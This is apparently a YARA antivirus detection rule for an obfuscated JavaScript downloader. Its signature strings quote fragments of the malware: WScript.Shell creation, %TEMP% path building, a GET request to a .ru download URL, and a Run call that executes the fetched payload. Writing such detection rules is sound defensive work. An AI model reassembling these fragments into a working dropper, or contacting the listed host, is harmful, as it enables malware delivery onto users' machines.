rule sig_20160427_b8fa7789701037d2395291fbbeea4ecb {
  meta:
    description = "datamaliciousorder - file 20160427_b8fa7789701037d2395291fbbeea4ecb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "06d6a45df0d02d0be8a049c488f5fee5ce84f4f3679aa1de94a7a0ce1e324ce8"

  strings:
    $s1  = "function NwaqxJsirm() {return AqlrbUdhbm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7flii49" ascii
    $s2  = "function NwaqxJsirm() {return AqlrbUdhbm[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7flii49" ascii
    $s3  = "function XvincBdshb(BcmnzEunuv, YzrxoQwqeo){VwlajMyini = VwlajMyini * 1; return BcmnzEunuv - YzrxoQwqeo;};" fullword ascii
    $s4  = "var AqlrbUdhbm = function AjlnsGgkfg() {return IgogqVnkaz[GhjvpKebex](\"WScript\"+\".Shell\");}(), OxmstBhgpl = 11;" fullword ascii
    $s5  = "CwhgiPglmp[JonkcFtgyd](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var IgogqVnkaz = this[\"WScript\"];" fullword ascii
    $s7  = "if (CwhgiPglmp[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function FaqwwPurcq(){return WvlipXjrcf + \"\";};" fullword ascii
    $s9  = "function JeuugMrdgz() {return ((UmrnfJttzh == true) && (UmrnfJttzh == SyfycTlkcg)) ? 1 : VwlajMyini;};" fullword ascii
    $s10 = "}while (AspjgYqllw);" fullword ascii
    $s11 = "var HfhxaLfmal = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "function QpermQzntp(WrymnDdfka) {var MjhkwTkpul = (1, 2, 3, 4, 5, WrymnDdfka); return MjhkwTkpul;};" fullword ascii
    $s13 = "var UmrnfJttzh = false;" fullword ascii
    $s14 = "function UdtfcZpqqi(){return GhjvpKebex;};" fullword ascii
    $s15 = "var SyfycTlkcg = false;" fullword ascii
    $s16 = "SyfycTlkcg = true; " fullword ascii
    $s17 = "function EibunFehqk(FgrqwLzroz){AqlrbUdhbm[\"R\"+\"un\"](FgrqwLzroz, VwlajMyini, VwlajMyini);};" fullword ascii
    $s18 = "function ImoonEkdas()" fullword ascii
    $s19 = "var WbxciKoksk = false;" fullword ascii
    $s20 = "function DmaemUtfec(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}